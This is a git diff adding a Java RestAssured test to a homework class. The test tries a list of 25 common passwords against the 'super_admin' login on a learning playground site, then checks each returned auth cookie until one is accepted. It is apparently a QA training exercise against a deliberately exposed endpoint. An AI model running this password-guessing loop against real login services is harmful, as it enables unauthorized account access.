@@ -113,4 +113,56 @@ public class HomeworkPathTwo {
         String responseResult = response.body().jsonPath().getString("result");
         System.out.println(responseResult != null);
     }
+
+    @Test
+    public void testEx8Password() {
+
+        String[] array = {
+        "123456", "123456789", "qwerty", "password", "1234567", "12345678", "iloveyou", "12345", "111111", "123123",
+                "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome",
+                "888888", "princess", "dragon", "password1", "123qwe"};
+        int i=0;
+        while (i<array.length) {
+            Map<String, String> data = new HashMap<>();
+
+            data.put("login", "super_admin");
+            data.put("password", array[i]);
+
+            Response responseForGet = RestAssured
+                    .given()
+                    .body(data)
+                    .when()
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+
+            String responseCookie = responseForGet.getCookie("auth_cookie");
+
+        Map<String, String> cookies = new HashMap<>();
+        if(responseCookie != null) {
+            cookies.put("auth_cookie", responseCookie);
+
+
+            Response responseForCheck = RestAssured
+                    .given()
+                    .body(data)
+                    .cookies(cookies)
+                    .when()
+                    .post("https://playground.learnqa.ru/api/check_auth_cookie")
+                    .andReturn();
+
+            responseForCheck.print();
+
+            if (responseForCheck.asString().contains("You are authorized"))
+            {
+                System.out.println("correct:"+array[i]);
+                break;
+            }
+            else
+            {
+                System.out.println("tried but incorrect:"+array[i]);
+            }
+        }
+            i++;
+        }
+    }
 }
